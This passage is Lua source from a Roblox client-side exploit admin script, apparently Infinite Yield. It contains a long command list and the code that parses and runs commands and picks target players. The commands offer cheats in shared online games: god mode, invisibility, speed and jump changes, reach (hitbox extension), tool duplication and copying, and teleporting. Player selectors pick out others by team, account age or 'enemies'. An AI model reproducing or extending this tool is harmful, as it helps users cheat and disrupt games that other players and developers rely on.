	CMDs[#CMDs + 1] = {NAME = 'respawn', DESC = 'Respawns you'}
	CMDs[#CMDs + 1] = {NAME = 'refresh / re', DESC = 'Respawns and brings you back to the same position'}
	CMDs[#CMDs + 1] = {NAME = 'god', DESC = 'Makes your character difficult to kill in most games'}
	CMDs[#CMDs + 1] = {NAME = 'invisible / invis', DESC = 'Makes you invisible to other players'}
	CMDs[#CMDs + 1] = {NAME = 'visible / vis', DESC = 'Makes you visible to other players'}
	CMDs[#CMDs + 1] = {NAME = 'toolinvisible / toolinvis / tinvis', DESC = 'Makes you invisible to other players and able to use tools'}
	CMDs[#CMDs + 1] = {NAME = 'speed / ws [num]', DESC = 'Change your walkspeed'}
	CMDs[#CMDs + 1] = {NAME = 'loopspeed / loopws [num]', DESC = 'Loops your walkspeed'}
	CMDs[#CMDs + 1] = {NAME = 'unloopspeed / unloopws', DESC = 'Turns off loopspeed'}
	CMDs[#CMDs + 1] = {NAME = 'hipheight / hheight [num]', DESC = 'Adjusts hip height'}
	CMDs[#CMDs + 1] = {NAME = 'jumppower / jpower / jp [num]', DESC = 'Change a players jump height'}
	CMDs[#CMDs + 1] = {NAME = 'loopjumppower / loopjp [num]', DESC = 'Loops your jump height'}
	CMDs[#CMDs + 1] = {NAME = 'unloopjumppower / unloopjp [num]', DESC = 'Turns off loopjumppower'}
	CMDs[#CMDs + 1] = {NAME = 'maxslopeangle / msa [num]', DESC = 'Adjusts MaxSlopeAngle'}
	CMDs[#CMDs + 1] = {NAME = 'gravity / grav [num] (CLIENT)', DESC = 'Change your gravity'}
	CMDs[#CMDs + 1] = {NAME = 'sit', DESC = 'Makes your character sit'}
	CMDs[#CMDs + 1] = {NAME = 'sitwalk', DESC = 'Makes your character sit while still being able to walk'}
	CMDs[#CMDs + 1] = {NAME = 'nosit', DESC = 'Prevents your character from sitting'}
	CMDs[#CMDs + 1] = {NAME = 'unnosit', DESC = 'Disables nosit'}
	CMDs[#CMDs + 1] = {NAME = 'jump', DESC = 'Makes your character jump'}
	CMDs[#CMDs + 1] = {NAME = 'infinitejump / infjump', DESC = 'Allows you to jump before hitting the ground'}
	CMDs[#CMDs + 1] = {NAME = 'uninfinitejump / uninfjump', DESC = 'Disables infjump'}
	CMDs[#CMDs + 1] = {NAME = 'flyjump', DESC = 'Allows you to hold space to fly up'}
	CMDs[#CMDs + 1] = {NAME = 'unflyjump', DESC = 'Disables flyjump'}
	CMDs[#CMDs + 1] = {NAME = 'autojump / ajump', DESC = 'Automatically jumps when you run into an object'}
	CMDs[#CMDs + 1] = {NAME = 'unautojump / unajump', DESC = 'Disables autojump'}
	CMDs[#CMDs + 1] = {NAME = 'edgejump / ejump', DESC = 'Automatically jumps when you get to the edge of an object'}
	CMDs[#CMDs + 1] = {NAME = 'unedgejump / unejump', DESC = 'Disables edgejump'}
	CMDs[#CMDs + 1] = {NAME = 'platformstand / stun', DESC = 'Enables PlatformStand'}
	CMDs[#CMDs + 1] = {NAME = 'unplatformstand / unstun', DESC = 'Disables PlatformStand'}
	CMDs[#CMDs + 1] = {NAME = 'norotate / noautorotate', DESC = 'Disables AutoRotate'}
	CMDs[#CMDs + 1] = {NAME = 'unnorotate / autorotate', DESC = 'Enables AutoRotate'}
	CMDs[#CMDs + 1] = {NAME = 'enablestate [StateType]', DESC = 'Enables a humanoid state type'}
	CMDs[#CMDs + 1] = {NAME = 'disablestate [StateType]', DESC = 'Disables a humanoid state type'}
	CMDs[#CMDs + 1] = {NAME = 'team [team name] (CLIENT)', DESC = 'Changes your team. Sometimes fools localscripts.'}
	CMDs[#CMDs + 1] = {NAME = 'nobillboardgui / nobgui / noname', DESC = 'Removes billboard and surface guis from your players (i.e. name guis at cafes)'}
	CMDs[#CMDs + 1] = {NAME = 'loopnobgui / loopnoname', DESC = 'Loop removes billboard and surface guis from your players (i.e. name guis at cafes)'}
	CMDs[#CMDs + 1] = {NAME = 'unloopnobgui / unloopnoname', DESC = 'Disables loopnobgui'}
	CMDs[#CMDs + 1] = {NAME = 'nohead / headless', DESC = 'Removes your head (uses simulation radius)'}
	CMDs[#CMDs + 1] = {NAME = 'noarms', DESC = 'Removes your arms'}
	CMDs[#CMDs + 1] = {NAME = 'nolegs', DESC = 'Removes your legs'}
	CMDs[#CMDs + 1] = {NAME = 'nolimbs', DESC = 'Removes your limbs'}
	CMDs[#CMDs + 1] = {NAME = 'naked', DESC = 'Removes your clothing'}
	CMDs[#CMDs + 1] = {NAME = 'noface / removeface', DESC = 'Removes your face'}
	CMDs[#CMDs + 1] = {NAME = 'blockhead', DESC = 'Turns your head into a block'}
	CMDs[#CMDs + 1] = {NAME = 'blockhats', DESC = 'Turns your hats into blocks'}
	CMDs[#CMDs + 1] = {NAME = 'blocktool', DESC = 'Turns the currently selected tool into a block'}
	CMDs[#CMDs + 1] = {NAME = 'creeper', DESC = 'Makes you look like a creeper'}
	CMDs[#CMDs + 1] = {NAME = 'drophats', DESC = 'Drops your hats'}
	CMDs[#CMDs + 1] = {NAME = 'nohats / deletehats / rhats', DESC = 'Deletes your hats'}
	CMDs[#CMDs + 1] = {NAME = 'hatspin / spinhats', DESC = 'Spins your characters accessories'}
	CMDs[#CMDs + 1] = {NAME = 'unhatspin / unspinhats', DESC = 'Undoes spinhats'}
	CMDs[#CMDs + 1] = {NAME = 'clearhats / cleanhats', DESC = 'Clears hats in the workspace'}
	CMDs[#CMDs + 1] = {NAME = 'chardelete / cd [instance name]', DESC = 'Removes any part with a certain name from your character'}
	CMDs[#CMDs + 1] = {NAME = 'chardeleteclass / cdc [class name]', DESC = 'Removes any part with a certain classname from your character'}
	CMDs[#CMDs + 1] = {NAME = 'deletevelocity / dv / removeforces', DESC = 'Removes any velocity / force instances in your character'}
	CMDs[#CMDs + 1] = {NAME = 'weaken [num]', DESC = 'Makes your character less dense'}
	CMDs[#CMDs + 1] = {NAME = 'unweaken', DESC = 'Sets your characters CustomPhysicalProperties to default'}
	CMDs[#CMDs + 1] = {NAME = 'strengthen [num]', DESC = 'Makes your character more dense (CustomPhysicalProperties)'}
	CMDs[#CMDs + 1] = {NAME = 'unstrengthen', DESC = 'Sets your characters CustomPhysicalProperties to default'}
	CMDs[#CMDs + 1] = {NAME = 'breakvelocity', DESC = 'Sets your characters velocity to 0'}
	CMDs[#CMDs + 1] = {NAME = 'spin [speed]', DESC = 'Spins your character'}
	CMDs[#CMDs + 1] = {NAME = 'unspin', DESC = 'Disables spin'}
	CMDs[#CMDs + 1] = {NAME = 'split', DESC = 'Splits your character in half'}
	CMDs[#CMDs + 1] = {NAME = 'nilchar', DESC = 'Sets your characters parent to nil'}
	CMDs[#CMDs + 1] = {NAME = 'unnilchar / nonilchar', DESC = 'Sets your characters parent to workspace'}
	CMDs[#CMDs + 1] = {NAME = 'noroot / removeroot / rroot', DESC = 'Removes your characters HumanoidRootPart'}
	CMDs[#CMDs + 1] = {NAME = 'replaceroot', DESC = 'Replaces your characters HumanoidRootPart'}
	CMDs[#CMDs + 1] = {NAME = 'clearcharappearance / clearchar / clrchar', DESC = 'Removes all accessory, shirt, pants, charactermesh, and bodycolors'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'animation / anim [ID] [speed]', DESC = 'Makes your character perform an animation (must be by roblox to replicate)'}
	CMDs[#CMDs + 1] = {NAME = 'dance', DESC = 'Makes you  d a n c e'}
	CMDs[#CMDs + 1] = {NAME = 'undance', DESC = 'Stops dance animations'}
	CMDs[#CMDs + 1] = {NAME = 'spasm', DESC = 'Makes you  c r a z y'}
	CMDs[#CMDs + 1] = {NAME = 'unspasm', DESC = 'Stops spasm'}
	CMDs[#CMDs + 1] = {NAME = 'headthrow', DESC = 'Simply makes you throw your head'}
	CMDs[#CMDs + 1] = {NAME = 'noanim', DESC = 'Disables your animations'}
	CMDs[#CMDs + 1] = {NAME = 'reanim', DESC = 'Restores your animations'}
	CMDs[#CMDs + 1] = {NAME = 'animspeed [num]', DESC = 'Changes the speed of your current animation'}
	CMDs[#CMDs + 1] = {NAME = 'copyanimation / copyanim / copyemote [plr]', DESC = 'Copies someone elses animation'}
	CMDs[#CMDs + 1] = {NAME = 'loopanimation / loopanim', DESC = 'Loops your current animation'}
	CMDs[#CMDs + 1] = {NAME = 'stopanimations / stopanims', DESC = 'Stops running animations'}
	CMDs[#CMDs + 1] = {NAME = 'refreshanimations / refreshanims / reanim', DESC = 'Refreshes animations'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'autoclick [click delay] [release delay]', DESC = 'Automatically clicks your mouse with a set delay'}
	CMDs[#CMDs + 1] = {NAME = 'unautoclick / noautoclick', DESC = 'Turns off autoclick'}
	CMDs[#CMDs + 1] = {NAME = 'autokeypress [key] [down delay] [up delay]', DESC = 'Automatically presses a key with a set delay'}
	CMDs[#CMDs + 1] = {NAME = 'unautokeypress', DESC = 'Stops autokeypress'}
	CMDs[#CMDs + 1] = {NAME = 'hovername', DESC = 'Shows a players username when your mouse is hovered over them'}
	CMDs[#CMDs + 1] = {NAME = 'unhovername / nohovername', DESC = 'Turns off hovername'}
	CMDs[#CMDs + 1] = {NAME = 'mousesensitivity / ms [0-10]', DESC = 'Sets your mouse sensitivity (affects first person and right click drag) (default is 1)'}
	CMDs[#CMDs + 1] = {NAME = 'clickdelete', DESC = 'Go to settings>Keybinds>Add for clicktp'}
	CMDs[#CMDs + 1] = {NAME = 'clickteleport', DESC = 'Go to settings>Keybinds>Add for click tp'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'tools', DESC = 'Copies tools from ReplicatedStorage and Lighting'}
	CMDs[#CMDs + 1] = {NAME = 'notools / removetools / deletetools', DESC = 'Removes tools from character and backpack'}
	CMDs[#CMDs + 1] = {NAME = 'deleteselectedtool / dst', DESC = 'Removes any currently selected tools'}
	CMDs[#CMDs + 1] = {NAME = 'grabtools', DESC = 'Automatically get tools that are dropped'}
	CMDs[#CMDs + 1] = {NAME = 'ungrabtools / nograbtools', DESC = 'Disables grabtools'}
	CMDs[#CMDs + 1] = {NAME = 'copytools [plr] (CLIENT)', DESC = 'Copies a players tools'}
	CMDs[#CMDs + 1] = {NAME = 'dupetools / clonetools [num]', DESC = 'Duplicates your inventory tools a set ammount of times'}
	CMDs[#CMDs + 1] = {NAME = 'droptools', DESC = 'Drops your tools'}
	CMDs[#CMDs + 1] = {NAME = 'droppabletools', DESC = 'Makes your tools droppable'}
	CMDs[#CMDs + 1] = {NAME = 'equiptools', DESC = 'Equips every tool in your inventory at once'}
	CMDs[#CMDs + 1] = {NAME = 'reach [num]', DESC = 'Increases the hitbox of your held tool'}
	CMDs[#CMDs + 1] = {NAME = 'unreach / noreach', DESC = 'Turns off reach'}
	CMDs[#CMDs + 1] = {NAME = 'grippos [X Y Z]', DESC = 'Changes your current tools grip position'}
	CMDs[#CMDs + 1] = {NAME = 'usetools [ammount] [delay]', DESC = 'Activates all tools in your backpack at the same time'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'addalias [cmd] [alias]', DESC = 'Adds an alias to a command'}
	CMDs[#CMDs + 1] = {NAME = 'removealias [alias]', DESC = 'Removes a custom alias'}
	CMDs[#CMDs + 1] = {NAME = 'clraliases', DESC = 'Removes all custom aliases'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'addplugin / plugin [name]', DESC = 'Add a plugin via command'}
	CMDs[#CMDs + 1] = {NAME = 'removeplugin / deleteplugin [name]', DESC = 'Remove a plugin via command'}
	CMDs[#CMDs + 1] = {NAME = 'reloadplugin [name]', DESC = 'Reloads a plugin'}
	CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
	CMDs[#CMDs + 1] = {NAME = 'breakloops / break (cmd loops)', DESC = 'Stops any cmd loops (;100^1^cmd)'}
	CMDs[#CMDs + 1] = {NAME = 'removecmd / deletecmd', DESC = 'Removes a command until the admin is reloaded'}
	CMDs[#CMDs + 1] = {NAME = 'tpwalk / teleportwalk', DESC = 'Teleports you to your move direction'}
	CMDs[#CMDs + 1] = {NAME = 'untpwalk / unteleportwalk', DESC = 'Undoes tpwalk / teleportwalk'}
	wait()

	for i = 1, #CMDs do
		local newcmd = Example:Clone()
		newcmd.Parent = CMDsF
		newcmd.Visible = false
		newcmd.Text = CMDs[i].NAME
		newcmd.Name = 'CMD'
		table.insert(text1,newcmd)
		if CMDs[i].DESC ~= '' then
			local title = Instance.new("StringValue")
			title.Name = "Title"
			title.Parent = newcmd
			title.Value = CMDs[i].NAME
			local desc = Instance.new("StringValue")
			desc.Name = "Desc"
			desc.Parent = newcmd
			desc.Value = CMDs[i].DESC
			newcmd.MouseButton1Down:Connect(function()
				if newcmd.Visible and newcmd.TextTransparency == 0 then
					local currentText = Cmdbar.Text
					Cmdbar:CaptureFocus()
					autoComplete(newcmd.Text,currentText)
					maximizeHolder()
				end
			end)
		end
	end

	IndexContents('',true)

	function getText(object)
		if object ~= nil then
			if object:FindFirstChild('Desc') ~= nil then
				return {object.Desc.Value, object:FindFirstChild('Title')}
			elseif object.Parent:FindFirstChild('Desc') ~= nil then
				return {object.Parent.Desc.Value, object.Parent:FindFirstChild('Title')}
			end
		end
		return nil
	end

	function checkTT()
		local t
		local guisAtPosition = COREGUI:GetGuiObjectsAtPosition(IYMouse.X, IYMouse.Y)

		for _, gui in pairs(guisAtPosition) do
			if gui.Parent == CMDsF then
				t = gui
			end
		end

		if t ~= nil then
			local gt = getText(t)
			if gt ~= nil then
				local x = IYMouse.X
				local y = IYMouse.Y
				local xP
				local yP
				if IYMouse.X > 200 then
					xP = x - 201
				else
					xP = x + 21
				end
				if IYMouse.Y > (IYMouse.ViewSizeY-96) then
					yP = y - 97
				else
					yP = y
				end
				Tooltip.Position = UDim2.new(0, xP, 0, yP)
				Description.Text = gt[1]
				if gt[2] ~= nil then
					Title_3.Text = gt[2].Value
				else
					Title_3.Text = ''
				end
				Tooltip.Visible = true
			else
				Tooltip.Visible = false
			end
		else
			Tooltip.Visible = false
		end
	end

	function FindInTable(tbl,val)
		if tbl == nil then return false end
		for _,v in pairs(tbl) do
			if v == val then return true end
		end 
		return false
	end

	function GetInTable(Table, Name)
		for i = 1, #Table do
			if Table[i] == Name then
				return i
			end
		end
		return false
	end

	function respawn(plr)
		if invisRunning then TurnVisible() end
		local char = plr.Character
		if char:FindFirstChildOfClass("Humanoid") then char:FindFirstChildOfClass("Humanoid"):ChangeState(15) end
		char:ClearAllChildren()
		local newChar = Instance.new("Model")
		newChar.Parent = workspace
		plr.Character = newChar
		wait()
		plr.Character = char
		newChar:Destroy()
	end

	local refreshCmd = false
	function refresh(plr)
		refreshCmd = true
		local Human = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid", true)
		local pos = Human and Human.RootPart and Human.RootPart.CFrame
		local pos1 = workspace.CurrentCamera.CFrame
		respawn(plr)
		spawn(function()
			plr.CharacterAdded:Wait():WaitForChild("Humanoid").RootPart.CFrame, workspace.CurrentCamera.CFrame = pos, wait() and pos1
			refreshCmd = false
		end)
	end

	local lastDeath

	function onDied()
		spawn(function()
			if pcall(function() Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') end) and Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
				Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Died:Connect(function()
					if getRoot(Players.LocalPlayer.Character) then
						lastDeath = getRoot(Players.LocalPlayer.Character).CFrame
					end
				end)
			else
				wait(2)
				onDied()
			end
		end)
	end

	Clip = true
	spDelay = 0.1
	Players.LocalPlayer.CharacterAdded:Connect(function()
		NOFLY()
		Floating = false

		if not Clip then
			execCmd('clip nonotify')
		end

		repeat wait() until getRoot(Players.LocalPlayer.Character)

		pcall(function()
			if spawnpoint and not refreshCmd and spawnpos ~= nil then
				wait(spDelay)
				getRoot(Players.LocalPlayer.Character).CFrame = spawnpos
			end
		end)

		onDied()
	end)

	onDied()

	function getstring(begin)
		local start = begin-1
		local AA = '' for i,v in pairs(cargs) do
			if i > start then
				if AA ~= '' then
					AA = AA .. ' ' .. v
				else
					AA = AA .. v
				end
			end
		end
		return AA
	end

	findCmd=function(cmd_name)
		for i,v in pairs(cmds)do
			if v.NAME:lower()==cmd_name:lower() or FindInTable(v.ALIAS,cmd_name:lower()) then
				return v
			end
		end
		return customAlias[cmd_name:lower()]
	end

	function splitString(str,delim)
		local broken = {}
		if delim == nil then delim = "," end
		for w in string.gmatch(str,"[^"..delim.."]+") do
			table.insert(broken,w)
		end
		return broken
	end

	cmdHistory = {}
	local lastCmds = {}
	local historyCount = 0
	local split=" "
	local lastBreakTime = 0
	function execCmd(cmdStr,speaker,store)
		cmdStr = cmdStr:gsub("%s+$","")
		spawn(function()
			local rawCmdStr = cmdStr
			cmdStr = string.gsub(cmdStr,"\\\\","%%BackSlash%%")
			local commandsToRun = splitString(cmdStr,"\\")
			for i,v in pairs(commandsToRun) do
				v = string.gsub(v,"%%BackSlash%%","\\")
				local x,y,num = v:find("^(%d+)%^")
				local cmdDelay = 0
				local infTimes = false
				if num then
					v = v:sub(y+1)
					local x,y,del = v:find("^([%d%.]+)%^")
					if del then
						v = v:sub(y+1)
						cmdDelay = tonumber(del) or 0
					end
				else
					local x,y = v:find("^inf%^")
					if x then
						infTimes = true
						v = v:sub(y+1)
						local x,y,del = v:find("^([%d%.]+)%^")
						if del then
							v = v:sub(y+1)
							del = tonumber(del) or 1
							cmdDelay = (del > 0 and del or 1)
						else
							cmdDelay = 1
						end
					end
				end
				num = tonumber(num or 1)

				if v:sub(1,1) == "!" then
					local chunks = splitString(v:sub(2),split)
					if chunks[1] and lastCmds[chunks[1]] then v = lastCmds[chunks[1]] end
				end

				local args = splitString(v,split)
				local cmdName = args[1]
				local cmd = findCmd(cmdName)
				if cmd then
					table.remove(args,1)
					cargs = args
					if not speaker then speaker = Players.LocalPlayer end
					if store then
						if speaker == Players.LocalPlayer then
							if cmdHistory[1] ~= rawCmdStr and rawCmdStr:sub(1,11) ~= 'lastcommand' and rawCmdStr:sub(1,7) ~= 'lastcmd' then
								table.insert(cmdHistory,1,rawCmdStr)
							end
						end
						if #cmdHistory > 30 then table.remove(cmdHistory) end

						lastCmds[cmdName] = v
					end
					local cmdStartTime = tick()
					if infTimes then
						while lastBreakTime < cmdStartTime do
							local success,err = pcall(cmd.FUNC,args, speaker)
							if not success and _G.IY_DEBUG then
								warn("Command Error:", cmdName, err)
							end
							wait(cmdDelay)
						end
					else
						for rep = 1,num do
							if lastBreakTime > cmdStartTime then break end
							local success,err = pcall(function()
								cmd.FUNC(args, speaker)
							end)
							if not success and _G.IY_DEBUG then
								warn("Command Error:", cmdName, err)
							end
							if cmdDelay ~= 0 then wait(cmdDelay) end
						end
					end
				end
			end
		end)
	end	

	function addcmd(name,alias,func,plgn)
		cmds[#cmds+1]=
			{
				NAME=name;
				ALIAS=alias or {};
				FUNC=func;
				PLUGIN=plgn;
			}
	end

	function removecmd(cmd)
		if cmd ~= " " then
			for i = #cmds,1,-1 do
				if cmds[i].NAME == cmd or FindInTable(cmds[i].ALIAS,cmd) then
					table.remove(cmds, i)
					for a,c in pairs(CMDsF:GetChildren()) do
						if string.find(c.Text, "^"..cmd.."$") or string.find(c.Text, "^"..cmd.." ") or string.find(c.Text, " "..cmd.."$") or string.find(c.Text, " "..cmd.." ") then
							c.TextTransparency = 0.7
							c.MouseButton1Click:Connect(function()
								notify(c.Text, "Command has been disabled by you or a plugin")
							end)
						end
					end
				end
			end
		end
	end

	function addbind(cmd,key,iskeyup)
		binds[#binds+1]=
			{
				COMMAND=cmd;
				KEY=key;
				ISKEYUP=iskeyup;
			}
	end

	function addcmdtext(text,name,desc)
		local newcmd = Example:Clone()
		local tooltipText = tostring(text)
		local tooltipDesc = tostring(desc)
		newcmd.Parent = CMDsF
		newcmd.Visible = false
		newcmd.Text = text
		newcmd.Name = 'PLUGIN_'..name
		table.insert(text1,newcmd)
		if desc and desc ~= '' then
			local title = Instance.new("StringValue")
			title.Name = "Title"
			title.Parent = newcmd
			title.Value = tooltipText
			local desc = Instance.new("StringValue")
			desc.Name = "Desc"
			desc.Parent = newcmd
			desc.Value = tooltipDesc
			newcmd.MouseButton1Down:Connect(function()
				if newcmd.Visible and newcmd.TextTransparency == 0 then
					Cmdbar:CaptureFocus()
					autoComplete(newcmd.Text)
					maximizeHolder()
				end
			end)
		end
	end

	SpecialPlayerCases = {
		["all"] = function(speaker)return Players:GetPlayers() end,
		["others"] = function(speaker)
			local plrs = {}
			for i,v in pairs(Players:GetPlayers()) do
				if v ~= speaker then
					table.insert(plrs,v)
				end
			end
			return plrs
		end,
		["me"] = function(speaker)return {speaker} end,
		["#(%d+)"] = function(speaker,args,currentList)
			local returns = {}
			local randAmount = tonumber(args[1])
			local players = {unpack(currentList)}
			for i = 1,randAmount do
				if #players == 0 then break end
				local randIndex = math.random(1,#players)
				table.insert(returns,players[randIndex])
				table.remove(players,randIndex)
			end
			return returns
		end,
		["random"] = function(speaker,args,currentList)
			local players = currentList
			return {players[math.random(1,#players)]}
		end,
		["%%(.+)"] = function(speaker,args)
			local returns = {}
			local team = args[1]
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Team and string.sub(string.lower(plr.Team.Name),1,#team) == string.lower(team) then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["allies"] = function(speaker)
			local returns = {}
			local team = speaker.Team
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Team == team then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["enemies"] = function(speaker)
			local returns = {}
			local team = speaker.Team
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Team ~= team then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["team"] = function(speaker)
			local returns = {}
			local team = speaker.Team
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Team == team then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["nonteam"] = function(speaker)
			local returns = {}
			local team = speaker.Team
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Team ~= team then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["friends"] = function(speaker,args)
			local returns = {}
			for _,plr in pairs(Players:GetPlayers()) do
				if plr:IsFriendsWith(speaker.UserId) and plr ~= speaker then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["nonfriends"] = function(speaker,args)
			local returns = {}
			for _,plr in pairs(Players:GetPlayers()) do
				if not plr:IsFriendsWith(speaker.UserId) and plr ~= speaker then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["guests"] = function(speaker,args)
			local returns = {}
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Guest then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["bacons"] = function(speaker,args)
			local returns = {}
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Character:FindFirstChild('Pal Hair') or plr.Character:FindFirstChild('Kate Hair') then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["age(%d+)"] = function(speaker,args)
			local returns = {}
			local age = tonumber(args[1])
			if not age == nil then return end
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.AccountAge <= age then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["nearest"] = function(speaker,args,currentList)
			local speakerChar = speaker.Character
			if not speakerChar or not getRoot(speakerChar) then return end
			local lowest = math.huge
			local NearestPlayer = nil
			for _,plr in pairs(currentList) do
				if plr ~= speaker and plr.Character then
					local distance = plr:DistanceFromCharacter(getRoot(speakerChar).Position)
					if distance < lowest then
						lowest = distance
						NearestPlayer = {plr}
					end
				end
			end
			return NearestPlayer
		end,
		["farthest"] = function(speaker,args,currentList)
			local speakerChar = speaker.Character
			if not speakerChar or not getRoot(speakerChar) then return end
			local highest = 0
			local Farthest = nil
			for _,plr in pairs(currentList) do
				if plr ~= speaker and plr.Character then
					local distance = plr:DistanceFromCharacter(getRoot(speakerChar).Position)
					if distance > highest then
						highest = distance
						Farthest = {plr}
					end
				end
			end
			return Farthest
		end,
		["group(%d+)"] = function(speaker,args)
			local returns = {}
			local groupID = tonumber(args[1])
			for _,plr in pairs(Players:GetPlayers()) do
				if plr:IsInGroup(groupID) then  
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["alive"] = function(speaker,args)
			local returns = {}
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Character and plr.Character:FindFirstChildOfClass("Humanoid") and plr.Character:FindFirstChildOfClass("Humanoid").Health > 0 then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["dead"] = function(speaker,args)
			local returns = {}
			for _,plr in pairs(Players:GetPlayers()) do
				if (not plr.Character or not plr.Character:FindFirstChildOfClass("Humanoid")) or plr.Character:FindFirstChildOfClass("Humanoid").Health <= 0 then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["rad(%d+)"] = function(speaker,args)
			local returns = {}
			local radius = tonumber(args[1])
			local speakerChar = speaker.Character
			if not speakerChar or not getRoot(speakerChar) then return end
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Character and getRoot(plr.Character) then
					local magnitude = (getRoot(plr.Character).Position-getRoot(speakerChar).Position).magnitude
					if magnitude <= radius then table.insert(returns,plr) end
				end
			end
			return returns
		end
	}

	function toTokens(str)
		local tokens = {}
		for op,name in string.gmatch(str,"([+-])([^+-]+)") do
			table.insert(tokens,{Operator = op,Name = name})
		end
		return tokens
	end

	function onlyIncludeInTable(tab,matches)
		local matchTable = {}
		local resultTable = {}
		for i,v in pairs(matches) do matchTable[v.Name] = true end
		for i,v in pairs(tab) do if matchTable[v.Name] then table.insert(resultTable,v) end end
		return resultTable
	end

	function removeTableMatches(tab,matches)
		local matchTable = {}
		local resultTable = {}
		for i,v in pairs(matches) do matchTable[v.Name] = true end
		for i,v in pairs(tab) do if not matchTable[v.Name] then table.insert(resultTable,v) end end
		return resultTable
	end

	function getPlayersByName(name)
		local found = {}
		for i,v in pairs(Players:GetChildren()) do
			if string.sub(string.lower(v.Name),1,#name) == string.lower(name) then
				table.insert(found,v)
			end
		end
		return found
	end

	function getPlayer(list,speaker)
		if list == nil then return {speaker.Name} end
		local nameList = splitString(list,",")

		local foundList = {}

		for _,name in pairs(nameList) do
			if string.sub(name,1,1) ~= "+" and string.sub(name,1,1) ~= "-" then name = "+"..name end
			local tokens = toTokens(name)
			local initialPlayers = Players:GetPlayers()

			for i,v in pairs(tokens) do
				if v.Operator == "+" then
					local tokenContent = v.Name
					local foundCase = false
					for regex,case in pairs(SpecialPlayerCases) do
						local matches = {string.match(tokenContent,"^"..regex.."$")}
						if #matches > 0 then
							foundCase = true
							initialPlayers = onlyIncludeInTable(initialPlayers,case(speaker,matches,initialPlayers))
						end
					end
					if not foundCase then
						initialPlayers = onlyIncludeInTable(initialPlayers,getPlayersByName(tokenContent))
					end
				else
					local tokenContent = v.Name
					local foundCase = false
					for regex,case in pairs(SpecialPlayerCases) do
						local matches = {string.match(tokenContent,"^"..regex.."$")}
						if #matches > 0 then
							foundCase = true
							initialPlayers = removeTableMatches(initialPlayers,case(speaker,matches,initialPlayers))
						end
					end
					if not foundCase then
						initialPlayers = removeTableMatches(initialPlayers,getPlayersByName(tokenContent))
					end
				end
			end

			for i,v in pairs(initialPlayers) do table.insert(foundList,v) end
		end

		local foundNames = {}
		for i,v in pairs(foundList) do table.insert(foundNames,v.Name) end

		return foundNames
	end

	getprfx=function(strn)
		if strn:sub(1,string.len(prefix))==prefix then return{'cmd',string.len(prefix)+1}
		end return
	end

	function do_exec(str, plr)
		str = str:gsub('/e ', '')
		local t = getprfx(str)
		if not t then return end
		str = str:sub(t[2])
		if t[1]=='cmd' then
			execCmd(str, plr, true)
			IndexContents('',true,false,true)
			CMDsF.CanvasPosition = canvasPos
		end
	end

	lastTextBoxString,lastTextBoxCon,lastEnteredString = nil,nil,nil

	UserInputService.TextBoxFocused:Connect(function(obj)
		if lastTextBoxCon then lastTextBoxCon:Disconnect() end
		if obj == Cmdbar then lastTextBoxString = nil return end
		lastTextBoxString = obj.Text
		lastTextBoxCon = obj:GetPropertyChangedSignal("Text"):Connect(function()
			if not (UserInputService:IsKeyDown(Enum.KeyCode.Return) or UserInputService:IsKeyDown(Enum.KeyCode.KeypadEnter)) then
				lastTextBoxString = obj.Text
			end
		end)
	end)

	UserInputService.InputBegan:Connect(function(input,gameProcessed)
		if gameProcessed then
			if Cmdbar and Cmdbar:IsFocused() then
				if input.KeyCode == Enum.KeyCode.Up then
					historyCount = historyCount + 1
					if historyCount > #cmdHistory then historyCount = #cmdHistory end
					Cmdbar.Text = cmdHistory[historyCount] or ""
					Cmdbar.CursorPosition = 1020
				elseif input.KeyCode == Enum.KeyCode.Down then
					historyCount = historyCount - 1
					if historyCount < 0 then historyCount = 0 end
					Cmdbar.Text = cmdHistory[historyCount] or ""
					Cmdbar.CursorPosition = 1020
				end
			elseif input.KeyCode == Enum.KeyCode.Return or input.KeyCode == Enum.KeyCode.KeypadEnter then
				lastEnteredString = lastTextBoxString
			end
		end
	end)

	Players.LocalPlayer.Chatted:Connect(function()
		wait()
		if lastEnteredString then
			local message = lastEnteredString
			lastEnteredString = nil
			do_exec(message, Players.LocalPlayer)
		end
	end)

	Cmdbar.PlaceholderText = "Command Bar ("..prefix..")"
	Cmdbar:GetPropertyChangedSignal("Text"):Connect(function()
		if Cmdbar:IsFocused() then
			IndexContents(Cmdbar.Text,true,true)
		end
	end)

	local tabComplete = nil
	Cmdbar.FocusLost:Connect(function(enterpressed)
		if enterpressed then
			local cmdbarText = Cmdbar.Text:gsub("^"..'%'..prefix,"")
